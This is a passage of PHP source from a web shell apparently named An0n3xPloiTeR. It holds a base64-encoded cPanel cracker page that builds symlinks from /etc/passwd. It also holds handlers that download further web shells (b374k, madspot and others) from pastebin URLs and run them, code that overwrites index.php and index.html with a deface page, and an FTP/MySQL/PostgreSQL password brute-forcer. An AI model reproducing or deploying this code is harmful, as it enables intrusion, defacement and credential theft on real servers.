W1lIHNpemU9Mz5bIERvbmUgXTwvZm9udD48L2NlbnRlcj4iOwoJCQkJCWVjaG8gIjxicj48Y2VudGVyPjxhIGhyZWY9JGZuLyB0YXJnZXQ9X2JsYW5rPjxmb250IHNpemU9MyBjb2xvcj0jMDA5OTAwPnwgR28gSGVyZSB8PC9mb250PjwvYT48L2NlbnRlcj4iOyAKCQkJCX0KCQkJCWVsc2UKCQkJCXsKCQkJCQlta2RpcigkZm4pOwoJCQkJCWNoZGlyKCRmbik7CgkJCQkJJHRlbXAgPSAiIjsKCQkJCQkkdmFsMSA9IDA7CgkJCQkJJHZhbDIgPSAxMDAwOwoJCQkJCWZvcig7JHZhbDEgPD0gJHZhbDI7JHZhbDErKykgCgkJCQkJewoJCQkJCQkkdWlkID0gQHBvc2l4X2dldHB3dWlkKCR2YWwxKTsKCQkJCQkJaWYgKCR1aWQpCgkJCQkJCQkkdGVtcCAuPSBqb2luKCc6JywkdWlkKS4iXG4iOwoJCQkJCSB9CgkJCQkJIGVjaG8gJzxici8+JzsKCQkJCQkgJHRlbXAgPSB0cmltKCR0ZW1wKTsKCQkJCQkgCgkJCQkJICRmaWxlNSA9IGZvcGVuKCJ0ZXN0LnR4dCIsInciKTsKCQkJCQkgZnB1dHMoJGZpbGU1LCR0ZW1wKTsKCQkJCQkgZmNsb3NlKCRmaWxlNSk7CgokaHRhY2Nlc3MgPQonVDNCMGFXOXVjeUJoYkd3Z0NrUnBjbVZqZEc5eWVVbHVaR1Y0SUhKbFlXUnRaUzVvZEcxc0lBcEJaR1JVZVhCbElIUmxlSFF2Y0d4aAphVzRnTG5Cb2NDQUtRV1JrU0dGdVpHeGxjaUJ6WlhKMlpYSXRjR0Z5YzJWa0lDNXdhSEFnQ2tGa1pGUjVjR1VnZEdWNGRDOXdiR0ZwCmJpQXVhSFJ0YkNBS1FXUmtTR0Z1Wkd4bGNpQjBlSFFnTG1oMGJXd2dDbEpsY1hWcGNtVWdUbTl1WlNBS1UyRjBhWE5tZVNCQmJuaz0KJzsKJGZpbGUgPSBmb3BlbigiLmh0YWNjZXNzIiwidysiKTsKJHdyaXRlID0gZndyaXRlICgkZmlsZSAsYmFzZTY0X2RlY29kZSgkaHRhY2Nlc3MpKTsKCQkJCQkgCgkJCQkJICRmaWxlID0gZm9wZW4oInRlc3QudHh0IiwgInIiKSBvciBleGl0KCJVbmFibGUgdG8gb3BlbiBmaWxlISIpOwoJCQkJCSB3aGlsZSghZmVvZigkZmlsZSkpCgkJCQkJIHsKCQkJCQkJJHMgPSBmZ2V0cygkZmlsZSk7CgkJCQkJCSRtYXRjaGVzID0gYXJyYXkoKTsKCQkJCQkJJHQgPSBwcmVnX21hdGNoKCcvXC8oLio/KVw6XC8vcycsICRzLCAkbWF0Y2hlcyk7CgkJCQkJCSRtYXRjaGVzID0gc3RyX3JlcGxhY2UoImhvbWUvIiwiIiwkbWF0Y2hlc1sxXSk7CgkJCQkJCWlmKHN0cmxlbigkbWF0Y2hlcykgPiAxMiB8fCBzdHJsZW4oJG1hdGNoZXMpID09IDAgfHwgJG1hdGNoZXMgPT0gImJpbiIgfHwgJG1hdGNoZXMgPT0gImV0Yy9YMTEvZnMiIHx8ICRtYXRjaGVzID09ICJ2YXIvbGliL25mcyIgfHwgJG1hdGNoZXMgPT0gInZhci9hcnB3YXRjaCIgfHwgJG1hdGNoZXMgPT0gInZhci9nb3BoZXIiIHx8ICRtYXRjaGVzID09ICJzYmluIiB8fCAkbWF0Y2hlcyA9PSAidmFyL2FkbSIgfHwgJG1hdGNoZXMgPT0gInVzci9nYW1lcyIgfHwgJG1hdGNoZXMgPT0gInZhci9mdHAiIHx8ICRtYXRjaGVzID09ICJldGMvbnRwIiB8fCAkbWF0Y2hlcyA9PSAidmFyL3d3dyIgfHwgJG1hdGNoZXMgPT0gInZhci9uYW1lZCIpCgkJCQkJCQljb250aW51ZTsKCQkJCQkJc3ltbCgkbWF0Y2hlcywkbWF0Y2hlcyk7CgkJCQkJIH0KCQkJCQlmY2xvc2UoJGZpbGUpOwoJCQkJCWVjaG8gIjwvdGFibGU+IjsKCQkJCQl1bmxpbmsoInRlc3QudHh0Iik7CgkJCQkJZWNobyAiPGNlbnRlcj48Zm9udCBjb2xvcj1saW1lIHNpemU9Mz5bIERvbmUgXTwvZm9udD48L2NlbnRlcj4iOwoJCQkJCWVjaG8gIjxicj48Y2VudGVyPjxhIGhyZWY9JGZuLyB0YXJnZXQ9X2JsYW5rPjxmb250IHNpemU9MyBjb2xvcj0jMDA5OTAwPnwgR28gSGVyZSB8PC9mb250PjwvYT48L2NlbnRlcj4iOyAKCQkJCX0KZWNobyAiPGhyPjxjZW50ZXI+PGI+PGEgaHJlZj0iLiRfU0VSVkVSWydQSFBfU0VMRiddLiI+PDwgQkFDSzwvYT4iOwpleGl0Owp9Cj8+Cjxmb3JtIG1ldGhvZD0iUE9TVCIgdGFyZ2V0PSJfYmxhbmsiPgoJPHN0cm9uZz4KPGlucHV0IG5hbWU9InBhZ2UiIHR5cGU9ImhpZGRlbiIgdmFsdWU9ImZpbmQiPjx0YWJsZT4gICAgICAJCQkJCiAgICA8L3N0cm9uZz48YnI+PGJyPjxjZW50ZXI+PGZvbnQgc2l6ZT0iMyIgYWxpZ249ImNlbnRlciIgc3R5bGU9Iml0YWxpYyIgY29sb3I9IiMwMGZmMDAiPistLT1bIENwYW5lbCBCcnV0ZUZvcmNlIF09LS0rPC9mb250PjwvY2VudGVyPjxicj4KICAgIDx0YWJsZSB3aWR0aD0iNjAwIiBib3JkZXI9IjAiIGNsYXNzPSJ0YWJuZXQiIGNlbGxwYWRkaW5nPSIzIiBjZWxsc3BhY2luZz0iMSIgYWxpZ249ImNlbnRlciI+Cgk8dHI+Cgk8dGQgdmFsaWduPSJ0b3AiIGJnY29sb3I9IiMxNTE1MTUiIGNsYXNzPSJzdHlsZTIiIHN0eWxlPSJ3aWR0aDogMTM5cHgiPgoJPGNlbnRlcj48Yj48Zm9udCBzaXplPSIzIiBzdHlsZT0iaXRhbGljIiBjb2xvcj0iIzAwZmYwMCI+WyBDcGFuZWwgQnJ1dGUgRm9yY2UgXTwvZm9udD48L2I+PC9jZW50ZXI+PC90ZD48L3RyPgogICAgPHRyPgogICAgPHRkPgogICAgPHRhYmxlIHdpZHRoPSIxMDAlIiBib3JkZXI9IjAiIGNlbGxwYWRkaW5nPSIzIiBjZWxsc3BhY2luZz0iMSIgYWxpZ249ImNlbnRlciI+CiAgICA8dGQgdmFsaWduPSJ0b3AiIGJnY29sb3I9IiMxNTE1MTUiIGNsYXNzPSJzdHlsZTIiIHN0eWxlPSJ3aWR0aDogMTM5cHgiPgoJPHN0cm9uZz5Vc2VybmFtZSBMaXN0IDo8L3N0cm9uZz48L3RkPgogICAgPHRkIHZhbGlnbj0idG9wIiBiZ2NvbG9yPSIjMTUxNTE1IiBjb2xzcGFuPSI1Ij48c3Ryb25nPjx0ZXh0YXJlYSBjb2xzPSI3OSIgY2xhc3MgPSdpbnB1dHonIHJvd3M9IjEwIiBuYW1lPSJ1c2VybmFtZXMiPjw/cGhwIHN5c3RlbSgnbHMgL3Zhci9tYWlsJyk7Pz48L3RleHRhcmVhPjwvc3Ryb25nPjwvdGQ+CiAgICA8L3RyPgogICAgPHRyPgogICAgPHRkIHZhbGlnbj0idG9wIiBiZ2NvbG9yPSIjMTUxNTE1IiBjbGFzcz0ic3R5bGUyIiBzdHlsZT0id2lkdGg6IDEzOXB4Ij4KCTxzdHJvbmc+UGFzc3dvcmQgTGlzdCA6PC9zdHJvbmc+PC90ZD4KICAgIDx0ZCB2YWxpZ249InRvcCIgYmdjb2xvcj0iIzE1MTUxNSIgY29sc3Bhbj0iNSI+PHN0cm9uZz48dGV4dGFyZWEgY29scz0iNzkiIGNsYXNzID0naW5wdXR6JyByb3dzPSIxMCIgbmFtZT0icGFzc3dvcmRzIj48L3RleHRhcmVhPjwvc3Ryb25nPjwvdGQ+CiAgICA8L3RyPgogICAgPHRyPgogICAgPHRkIHZhbGlnbj0idG9wIiBiZ2NvbG9yPSIjMTUxNTE1IiBjbGFzcz0ic3R5bGUyIiBzdHlsZT0id2lkdGg6IDEzOXB4Ij4KCTxzdHJvbmc+VHlwZSA6PC9zdHJvbmc+PC90ZD4KICAgIDx0ZCB2YWxpZ249InRvcCIgYmdjb2xvcj0iIzE1MTUxNSIgY29sc3Bhbj0iNSI+CiAgICA8c3BhbiBjbGFzcz0ic3R5bGUyIj48c3Ryb25nPlNpbXBsZSA6IDwvc3Ryb25nPiA8L3NwYW4+Cgk8c3Ryb25nPgoJPGlucHV0IHR5cGU9InJhZGlvIiBuYW1lPSJ0eXBlIiB2YWx1ZT0ic2ltcGxlIiBjaGVja2VkPSJjaGVja2VkIiBjbGFzcz0ic3R5bGUzIj48L3N0cm9uZz4KICAgIDxmb250IGNsYXNzPSJzdHlsZTIiPjxzdHJvbmc+L2V0Yy9wYXNzd2QgOiA8L3N0cm9uZz4gPC9mb250PgoJPHN0cm9uZz4KCTxpbnB1dCB0eXBlPSJyYWRpbyIgbmFtZT0idHlwZSIgdmFsdWU9InBhc3N3ZCIgY2xhc3M9InN0eWxlMyI+PC9zdHJvbmc+PHNwYW4gY2xhc3M9InN0eWxlMyI+PHN0cm9uZz4KCTwvc3Ryb25nPgoJPC9zcGFuPgogICAgPC90ZD4KICAgIDwvdHI+CiAgICA8dHI+CiAgICA8dGQgdmFsaWduPSJ0b3AiIGJnY29sb3I9IiMxNTE1MTUiIHN0eWxlPSJ3aWR0aDogMTM5cHgiPjwvdGQ+CiAgICA8dGQgdmFsaWduPSJ0b3AiIGJnY29sb3I9IiMxNTE1MTUiICBjb2xzcGFuPSI1Ij48c3Ryb25nPjxpbnB1dCBjbGFzcyA9J2lucHV0emJ1dCcgdHlwZT0ic3VibWl0IiB2YWx1ZT0iU3RhcnQiPgogICAgPC9zdHJvbmc+CiAgICA8L3RkPgogICAgPHRyPgo8L2Zvcm0+IAo8dHI+CiAgICA8dGQgdmFsaWduPSJ0b3AiIGJnY29sb3I9IiMxNTE1MTUiIGNsYXNzPSJzdHlsZTEiIGNvbHNwYW49IjYiPjxjZW50ZXI+PHN0cm9uZz5bIEdldCBDb25maWcgXTwvc3Ryb25nPjwvY2VudGVyPjwvdGQ+CiAgICAJCQkJPC90cj4KPGZvcm0gbWV0aG9kPSJQT1NUIiB0YXJnZXQ9Il9ibGFuayI+Cgk8c3Ryb25nPgo8aW5wdXQgbmFtZT0ibWVuZGFwYXRrYW4iIHR5cGU9ImhpZGRlbiIgdmFsdWU9InBhc3N3ZCI+ICAgICAgICAJCQkJCiAgICA8L3N0cm9uZz4KICAgIDx0cj4KICAgIDx0ZCB2YWxpZ249InRvcCIgYmdjb2xvcj0iIzE1MTUxNSIgc3R5bGU9IndpZHRoOiAxMzlweCI+PHN0cm9uZz5Gb2xkZXIgTmFtZSA6PC9zdHJvbmc+PC90ZD4KICAgIDx0ZCB2YWxpZ249InRvcCIgYmdjb2xvcj0iIzE1MTUxNSI+PHN0cm9uZz48aW5wdXQgY2xhc3MgPSdpbnB1dHonIHNpemU9IjUwIiBuYW1lPSJmb2xkZXJuYW1lIiB0eXBlPSJ0ZXh0Ij48L3N0cm9uZz48L3RkPgoJPC9zdHJvbmc+CiAgICA8L3RkPgogICAgPC90cj4KICAgIDx0cj4KICAgIDx0ZCB2YWxpZ249InRvcCIgYmdjb2xvcj0iIzE1MTUxNSIgc3R5bGU9IndpZHRoOiAxMzlweCI+PC90ZD4KICAgIDx0ZCB2YWxpZ249InRvcCIgYmdjb2xvcj0iIzE1MTUxNSIgY29sc3Bhbj0iNSI+PHN0cm9uZz48aW5wdXQgY2xhc3MgPSdpbnB1dHpidXQnIHR5cGU9InN1Ym1pdCIgdmFsdWU9IkdPIj4KICAgIDwvc3Ryb25nPgogICAgPC90ZD4KICAgIDx0cj4KPC9mb3JtPiAgIAo8dHI+CiAgICA8dGQgdmFsaWduPSJ0b3AiIGJnY29sb3I9IiMxNTE1MTUiIGNsYXNzPSJzdHlsZTEiIGNvbHNwYW49IjYiPjxjZW50ZXI+PHN0cm9uZz5bIEdldCBXb3JkbGlzdCBdPC9zdHJvbmc+PC9jZW50ZXI+PC90ZD4KICAgIAkJCQk8L3RyPgo8Zm9ybSBtZXRob2Q9IlBPU1QiIHRhcmdldD0iX2JsYW5rIj4KCTxzdHJvbmc+CjxpbnB1dCBuYW1lPSJwYXNzIiB0eXBlPSJoaWRkZW4iIHZhbHVlPSJwYXNzd29yZCI+ICAgICAgICAJCQkJCiAgICA8L3N0cm9uZz4KICAgIDx0cj4KICAgIDx0ZCB2YWxpZ249InRvcCIgYmdjb2xvcj0iIzE1MTUxNSIgc3R5bGU9IndpZHRoOiAxMzlweCI+PHN0cm9uZz5VcmwgQ29uZmlnIDo8L3N0cm9uZz48L3RkPgogICAgPHRkIHZhbGlnbj0idG9wIiBiZ2NvbG9yPSIjMTUxNTE1Ij48c3Ryb25nPjxpbnB1dCBjbGFzcyA9J2lucHV0eicgc2l6ZT0iNTAiIG5hbWU9InVybCIgdHlwZT0idGV4dCIgdmFsdWU9Imh0dHA6Ly93d3cuIj48L3N0cm9uZz48L3RkPgoJPC9zdHJvbmc+CiAgICA8L3RkPgogICAgPC90cj4KICAgIDx0cj4KICAgIDx0ZCB2YWxpZ249InRvcCIgYmdjb2xvcj0iIzE1MTUxNSIgc3R5bGU9IndpZHRoOiAxMzlweCI+PC90ZD4KICAgIDx0ZCB2YWxpZ249InRvcCIgYmdjb2xvcj0iIzE1MTUxNSIgY29sc3Bhbj0iNSI+PHN0cm9uZz48aW5wdXQgY2xhc3MgPSdpbnB1dHpidXQnIHR5cGU9InN1Ym1pdCIgdmFsdWU9IkdPIj4KICAgIDwvc3Ryb25nPgogICAgPC90ZD4KICAgIDx0cj4KPC9mb3JtPgo8dHI+CiAgICA8dGQgdmFsaWduPSJ0b3AiIGJnY29sb3I9IiMxNTE1MTUiIGNsYXNzPSJzdHlsZTEiIGNvbHNwYW49IjYiPjxjZW50ZXI+PHN0cm9uZz5bIEluZm8gCglTZWN1cml0eSBdPC9zdHJvbmc+PC9jZW50ZXI+PC90ZD4KICAgIAkJCQk8L3RyPgogICAgPHRyPgogICAgPHRkIHZhbGlnbj0idG9wIiBiZ2NvbG9yPSIjMTUxNTE1IiBzdHlsZT0id2lkdGg6IDEzOXB4Ij48c3Ryb25nPlNhZmUgTW9kZTwvc3Ryb25nPjwvdGQ+CiAgICA8dGQgdmFsaWduPSJ0b3AiIGJnY29sb3I9IiMxNTE1MTUiIGNvbHNwYW49IjUiPgoJPHN0cm9uZz4KPD9waHAKJHNhZmVfbW9kZSA9IGluaV9nZXQoJ3NhZmVfbW9kZScpOwppZigkc2FmZV9tb2RlPT0nMScpCnsKZWNobyAnT04nOwp9ZWxzZXsKZWNobyAnT0ZGJzsKfQoKPz4JCgk8L3N0cm9uZz4JCgk8L3RkPgogICAgCQkJCTwvdHI+CiAgICA8dHI+CiAgICA8dGQgdmFsaWduPSJ0b3AiIGJnY29sb3I9IiMxNTE1MTUiIHN0eWxlPSJ3aWR0aDogMTM5cHgiPjxzdHJvbmc+RGVzaWJsZSBGdW5jdGlvbjwvc3Ryb25nPjwvdGQ+CiAgICA8dGQgdmFsaWduPSJ0b3AiIGJnY29sb3I9IiMxNTE1MTUiIGNvbHNwYW49IjUiPgoJPHN0cm9uZz4KPGZvcm0gbWV0aG9kPSJQT1NUIiB0YXJnZXQ9Il9ibGFuayI+Cgk8c3Ryb25nPgo8aW5wdXQgbmFtZT0ibWF0aWthbiIgdHlwZT0iaGlkZGVuIiB2YWx1ZT0ic2VrYXRhbiI+ICAgICAgICAJCQkJCiAgICA8L3N0cm9uZz4KCjw/cGhwCmlmKCcnPT0oJGZ1bmM9QGluaV9nZXQoJ2Rpc2FibGVfZnVuY3Rpb25zJykpKQp7CmVjaG8gIjxmb250IGNvbG9yPSMwMGZmMDA+Tm8gU2VjdXJpdHkgZm9yIEZ1bmN0aW9uPC9mb250PjwvYj4iOwp9ZWxzZXsKZWNobyAnPHNjcmlwdD5hbGVydCgiUGxlYXNlIHNlZSBiZWxvdyBhbmQgcHJlc3MgPlBsZWFzZSBDbGljayBIZXJlIEZpcnN0ITwiKTs8L3NjcmlwdD4nOwplY2hvICI8Zm9udCBjb2xvcj1yZWQ+JGZ1bmM8L2ZvbnQ+PC9iPiI7CmVjaG8gJzx0cj48dGQgdmFsaWduPSJ0b3AiIGJnY29sb3I9IiMxNTE1MTUiIHN0eWxlPSJ3aWR0aDogMTM5cHgiPjwvdGQ+JzsKZWNobyAnPHRkIHZhbGlnbj0idG9wIiBiZ2NvbG9yPSIjMTUxNTE1IiBjb2xzcGFuPSI1Ij48c3Ryb25nPjxpbnB1dCB0eXBlPSJzdWJtaXQiIHZhbHVlPSJQbGVhc2UgQ2xpY2sgSGVyZSBGaXJzdCEiPgogICAgPC9zdHJvbmc+CiAgICA8L3RkPjwvdHI+JzsKfQo/Pjwvc3Ryb25nPjwvdGQ+PC90cj48L3RhYmxlPjwvdGFibGU+PC90YWJsZT4KPD8KYnJlYWs7CgojIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjYmRzCgpjYXNlICcnOgoKPz48P3BocCAKCmJyZWFrOwoKCi8vIFVwbG9hZGVyCmNhc2UgJ3VwbG9hZGVyJzoKCmVjaG8gJzxjZW50ZXI+PGI+Ky0tPVsgVXBsb2FkZXIgXT0tLSs8L2I+PGJyPjxicj48YnI+PGZvcm0gYWN0aW9uPSIiIG1ldGhvZD0icG9zdCIgZW5jdHlwZT0ibXVsdGlwYXJ0L2Zvcm0tZGF0YSIgbmFtZT0idXBsb2FkZXIiIGlkPSJ1cGxvYWRlciI+JzsKZWNobyAnPGNlbnRlcj48aW5wdXQgdHlwZT0iZmlsZSIgbmFtZT0iZmlsZSIgc2l6ZT0iNTAiPjxpbnB1dCBuYW1lPSJfdXBsIiB0eXBlPSJzdWJtaXQiIGlkPSJfdXBsIiB2YWx1ZT0iVXBsb2FkIj48L2Zvcm0+PC9jZW50ZXI+JzsKaWYoICRfUE9TVFsnX3VwbCddID09ICJVcGxvYWQiICkgewoJaWYoQGNvcHkoJF9GSUxFU1snZmlsZSddWyd0bXBfbmFtZSddLCAkX0ZJTEVTWydmaWxlJ11bJ25hbWUnXSkpIHsgZWNobyAnPHAgYWxpZ249ImNlbnRlciI+PGZvbnQgZmFjZT0iVmVyZGFuYSIgCgpzaXplPSIxIj48Zm9udCBjb2xvcj0id2hpdGUiPiBEb25lICEhPC9mb250Pjxicj4nOyB9CgllbHNlIHsgZWNobyAnPGZvbnQgY29sb3I9IiNGRjAwMDAiPkZhaWxlZCA6KCA8L2ZvbnQ+PC9wPgoJPC90ZD48L3RhYmxlPjwvdHI+CgonOyB9Cn0KYnJlYWs7Cgp9fQo/Pjxicj48YnI+PGJyPjxjZW50ZXI+PGZvcm0gYWN0aW9uPScnIG1ldGhvZD0ncG9zdCc+Cjx0YWJsZSBjbGFzcz0ndGFibmV0JyBzdHlsZT0nd2lkdGg6NjUwcHg7JyBib3JkZXI9Jyc+Cjx0aCBjb2xzcGFuPTEwPlNlY3VyaXR5IEluZm88L3RoPjx0cj4KPHRkPlN5c3RlbSA8L3RkPgo8dGQ+PD9waHAKZWNobyBwaHBfdW5hbWUoKTs/PjwvdGQ+CjwvdHI+CiA8dHI+CiAgICA8dGQgdmFsaWduPSJ0b3AiIGJnY29sb3I9IiIgc3R5bGU9IndpZHRoOiAxMzlweCI+U2FmZSBNb2RlPC90ZD4KICAgIDx0ZCB2YWxpZ249InRvcCIgYmdjb2xvcj0iIiBjb2xzcGFuPSI1Ij4KPD9waHAKJHNhZmVfbW9kZSA9IGluaV9nZXQoJ3NhZmVfbW9kZScpOwppZigkc2FmZV9tb2RlPT0nMScpCnsKZWNobyAnT04nOwp9ZWxzZXsKZWNobyAnT0ZGJzsKfQoKPz4JCgk8L3RkPgogICAgCQkJCTwvdHI+CgkJCQkJICA8dHI+CiAgICA8dGQgdmFsaWduPSJ0b3AiIGJnY29sb3I9IiIgc3R5bGU9IndpZHRoOiAxMzlweCI+RGVzaWJsZSBGdW5jdGlvbjwvdGQ+CiAgICA8dGQgdmFsaWduPSJ0b3AiIGJnY29sb3I9IiIgY29sc3Bhbj0iNSI+Cgo8Zm9ybSBtZXRob2Q9IlBPU1QiIHRhcmdldD0iX2JsYW5rIj4KCjxpbnB1dCBuYW1lPSJtYXRpa2FuIiB0eXBlPSJoaWRkZW4iIHZhbHVlPSJzZWthdGFuIj4gICAgICAgIAkJCQkKCgo8P3BocAppZignJz09KCRmdW5jPUBpbmlfZ2V0KCdkaXNhYmxlX2Z1bmN0aW9ucycpKSkKewplY2hvICI8Zm9udCBjb2xvcj0jMDBmZjAwPk5vIFNlY3VyaXR5IGZvciBGdW5jdGlvbjwvZm9udD48L2I+IjsKfWVsc2V7CmVjaG8gJzxzY3JpcHQ+YWxlcnQoIlBsZWFzZSBzZWUgYmVsb3cgYW5kIHByZXNzID5QbGVhc2UgQ2xpY2sgSGVyZSBGaXJzdCE8Iik7PC9zY3JpcHQ+JzsKZWNobyAiPGZvbnQgY29sb3I9cmVkPiRmdW5jPC9mb250PjwvYj4iOwplY2hvICc8dHI+PHRkIHZhbGlnbj0idG9wIiBiZ2NvbG9yPSIjMTUxNTE1IiBzdHlsZT0id2lkdGg6IDEzOXB4Ij48L3RkPic7CmVjaG8gJzx0ZCB2YWxpZ249InRvcCIgYmdjb2xvcj0iIzE1MTUxNSIgY29sc3Bhbj0iNSI+PHN0cm9uZz48aW5wdXQgdHlwZT0ic3VibWl0IiB2YWx1ZT0iUGxlYXNlIENsaWNrIEhlcmUgRmlyc3QhIj4KICAgIDwvdGQ+PC90cj4nOwp9Cj8+PHRyPgoKPC90YWJsZT48L2Zvcm0+PC9jZW50ZXI+CjxjZW50ZXI+PGJyPjxicj48Yj48ZGl2IGNsYXNzPSJpbmZvIj4tPVsgWC1DcGFuZWwgQ3JhY2tlciBieSA8c3BhbiBjbGFzcz0iZ2F5YSI+PGEgaHJlZj0iaHR0cDovL2ZhY2Vib29rLmNvbS93YWpkYW4uYnV0dCI+V2FqZGFuIEJ1dHQ8L2E+PC9zcGFuPiBdPS08L2Rpdj4gCjxkaXYgY2xhc3M9ImpheWEiPiAgJmNvcHk7IDIwMTQgVmFqMSBWMXJ1czwvZGl2PjwvY2VudGVyPjwvYj48YnI+PGJyPgoKPC9ib2R5PjwvaHRtbD4=';
		$file = fopen("cpc.php","w");
		$write = fwrite ($file ,base64_decode($cpc));
		fclose($file); 
		header("location:cpc.php");		} 


    function download_remote_file($file_url, $save_to)
    {
        $content = file_get_contents($file_url);

        file_put_contents($save_to, $content);

    }
    if (isset($_POST['dhanush'])) {
        download_remote_file('http://pastebin.com/raw/FHs6uGki', realpath("./") . '/dhanush.php');
        header("location:dhanush.php");		} 

	if (isset($_POST['symlink'])) {
		download_remote_file('http://pastebin.com/raw/FaQ9sQyE', realpath("./") . '/symlink.php');
        header("location:symlink.php");		} 

	

	if (isset($_POST['anonghosts'])) {
		download_remote_file('http://pastebin.com/raw/Cm3WsQXL', realpath("./") . '/anonghosts.php');
        header("location:anonghosts.php");		} 

	if (isset($_POST['blackhat'])) {
		download_remote_file('http://pastebin.com/raw/XFs2pPBM', realpath("./") . '/blackhat.php');
        header("location:blackhat.php");		} 

	if (isset($_POST['imageshell'])) {
		download_remote_file('http://pastebin.com/raw/eTbTMB4y', realpath("./") . '/imageshell.php');
        header("location:imageshell.php");		} 

	if (isset($_POST['madspot'])) {
		download_remote_file('http://pastebin.com/raw/mjKJRfXA', realpath("./") . '/madspot.php');
        header("location:madspot.php");		} 

    if (isset($_POST['pcd'])) { // password is aknight
		download_remote_file('http://pastebin.com/raw/cBiiU6MR', realpath("./") . '/pcd.php');
        header("location:pcd.php");		} 

    if (isset($_POST['cheta'])) { // password is aknight
		download_remote_file('http://pastebin.com/raw/H6ah5rnF', realpath("./") . '/cheta.php');
        header("location:cheta.php");		} 


    if (isset($_POST['1337worm'])) { // password is aknight
		download_remote_file('http://pastebin.com/raw/7WwNgWHh', realpath("./") . '/1337worm.php');
        header("location:1337worm.php");		} 


    if (isset($_POST['joker'])) { // password is aknight
		download_remote_file('http://pastebin.com/raw/eLT2PtZN', realpath("./") . '/joker.php');
        header("location:joker.php");		} 


    if (isset($_POST['b374k'])) { // password is aknight
		download_remote_file('http://pastebin.com/raw/UZuF1RKJ', realpath("./") . '/b374k.php');
        header("location:b374k.php");		} 

	if (isset($_POST['defacepage'])) {
	$file = fopen("index.php","w");
	$write = fwrite ($file ,base64_decode($defacepage));
	fclose($file);
	echo 'Done'; }

	if (isset($_POST['defacepage'])) {
	$file = fopen("index.html","w");
	$write = fwrite ($file ,base64_decode($defacepage));
	fclose($file);
	echo 'Done!'; }
   
function actionBruteforce() {
	An0n3xPloiTeRHeader();
	if( isset($_POST['proto']) ) {
		echo '<h1>Results</h1><div class=content><span>Type:</span> '.htmlspecialchars($_POST['proto']).' <span>Server:</span> '.htmlspecialchars($_POST['server']).'<br>';
		if( $_POST['proto'] == 'ftp' ) {
			function An0n3xPloiTeRBruteForce($ip,$port,$login,$pass) {
				$fp = @ftp_connect($ip, $port?$port:21);
				if(!$fp) return false;
				$res = @ftp_login($fp, $login, $pass);
				@ftp_close($fp);
				return $res;
			}
		} elseif( $_POST['proto'] == 'mysql' ) {
			function An0n3xPloiTeRBruteForce($ip,$port,$login,$pass) {
				$res = @mysql_connect($ip.':'.($port?$port:3306), $login, $pass);
				@mysql_close($res);
				return $res;
			}
		} elseif( $_POST['proto'] == 'pgsql' ) {
			function An0n3xPloiTeRBruteForce($ip,$port,$login,$pass) {
				$str = "host='".$ip."' port='".$port."' user='".$login."' password='".$pass."' dbname=postgres";
				$res = @pg_connect($str);
				@pg_close($res);
				return $res;
			}
		}
		$success = 0;
		$attempts = 0;
		$server = explode(":", $_POST['server']);
		if($_POST['type'] == 1) {
			$temp = @file('/etc/passwd');
			if( is_array($temp) )
				foreach($temp as $line) {
					$line = explode(":", $line);
					++$attempts;
					if( An0n3xPloiTeRBruteForce(@$server[0],@$server[1], $line[0], $line[0]) ) {
						$success++;
						echo '<b>'.htmlspecialchars($line[0]).'</b>:'.htmlspecialchars($line[0]).'<br>';
					}
					if(@$_POST['reverse']) {
						$tmp = "";
						for($i=strlen($line[0])-1; $i>=0; --$i)
							$tmp .= $line[0][$i];
						++$attempts;
						if( An0n3xPloiTeRBruteForce(@$server[0],@$server[1], $line[0], $tmp) ) {
							$success++;
							echo '<b>'.htmlspecialchars($line[0]).'</b>:'.htmlspecialchars($tmp);
						}
					}
				}
		} elseif($_POST['type'] == 2) {
			$temp = @file($_POST['dict']);
			if( is_array($temp) )
				foreach($temp as $line) {
					$line = trim($line);
					++$attempts;
					if( An0n3xPloiTeRBruteForce($server[0],@$server[1], $_POST['login'], $line) ) {
						$success++;
						echo '<b>'.htmlspecialchars($_POST['login']).'</b>:'.htmlspecialchars($line).'<br>';
					}
				}
		}
		echo "<span>Attempts:</span> $attempts <span>Success:</span> $success</div><br>";
	}
	echo '<center><h1>Bruteforce</h1></center><div class=content><table><form method=post><tr><td><span>Type</span></td>'
		.'<td><select name=proto><option value=ftp>FTP</option><option value=mysql>MySql</option><option value=pgsql>PostgreSql</option></select></td></tr><tr><td>'
		.'<input type=hidden name=c value="'.htmlspecialchars($GLOBALS['cwd']).'">'
		.'<input type=hidden name=a value="'.htmlspecialchars($_POST['a']).'">'
		.'<input type=hidden name=charset value="'.htmlspecialchars($_POST['charset']).'">'
		.'<span>Server:port</span></td>'
		.'<td><input type=text name=server value="127.0.0.1"></td></tr>'
		.'<tr><td><span>Brute type</span></td>'
		.'<td><label><input type=radio name=type value="1" checked> /etc/passwd</label></td></tr>'
		.'<tr><td></td><td><label style="padding-left:15px"><input type=checkbox name=reverse value=1 checked> reverse (login -> nigol)</label></td></tr>'
		.'<tr><td></td><td><label><input type=radio name=type value="2"> Dictionary</label></td></tr>'
		.'<tr><td></td><td><table style="padding-left:15px"><tr><td><span>Login</span></td>'
		.'<td><input type=text name=login value="root"></td></tr>'
		.'<tr><td><span>Dictionary</span></td>'
		.'<td><input type=text name=dict value="'.htmlspecialchars($GLOBALS['cwd']).'passwd.dic"></td></tr></table>'
		.'</td></tr><tr><td></td><td><input type=submit value=">>"></td></tr></form></table>';
	echo '</div><br>';
	An0n3xPloiTeRFooter();
}

function actionSql() {
	class DbClass {
		var $type;
		var $link;
		var $res;
		function DbClass($type)	{
			$this->type = $type;
		}
		function connect($host, $user, $pass, $dbname){
			switch($this->type)	{
				case 'mysql':
					if( $this->link = @mysql_connect($host,$user,$pass,true) ) return true;
					break;
				case 'pgsql':
					$host = explode(':', $host);
					if(!$host[1]) $host[1]=5432;
					if( $this->link = @pg_connect("host={$host[0]} port={$host[1]} user=$user password=$pass dbname=$dbname") ) return true;
					break;
			}
			return false;
		}
		function selectdb($db) {
			switch($this->type)	{
				case 'mysql':
					if (@mysql_select_db($db))return true;
					break;
			}
			return false;
		}
		function query($str) {
			switch($this->type) {
				case 'mysql':
					return $this->res = @mysql_query($str);
					break;
				case 'pgsql':
					return $this->res = @pg_query($this->link,$str);
					break;
			}
			return false;
		}
		function fetch() {
			$res = func_num_args()?func_get_arg(0):$this->res;
			switch($this->type)	{
				case 'mysql':
					return @mysql_fetch_assoc($res);
					break;
				case 'pgsql':
					return @pg_fetch_assoc($res);
					break;
			}
			return false;
		}
		function listDbs() {
			switch($this->type)	{
				case 'mysql':
                        return $this->query("SHOW databases");
				break;
				case 'pgsql':
					return $this->res = $this->query("SELECT datname FROM pg_database WHERE datistemplate!='t'");
				break;
